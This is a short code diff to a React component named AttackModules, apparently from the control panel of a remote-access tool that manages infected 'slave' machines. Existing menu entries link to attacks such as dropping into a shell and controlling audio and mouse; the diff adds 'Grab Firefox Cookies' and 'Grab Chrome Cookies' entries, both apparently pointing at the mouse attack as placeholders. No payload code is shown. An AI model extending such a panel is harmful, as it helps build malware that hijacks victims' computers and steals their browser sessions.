@@ -57,6 +57,8 @@ export function AttackModules({ slave }: { slave: SlaveData }) {
             <ModuleItem title="Drop Into Shell" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=shell`}/>
             <ModuleItem title="Audio Player" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=audio_player`}/>
             <ModuleItem title="Mouse" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=mouse`} />
+            <ModuleItem title="Grab Firefox Cookies" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=mouse`} />
+            <ModuleItem title="Grab Chrome Cookies" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=mouse`} />
             
         
         </div>
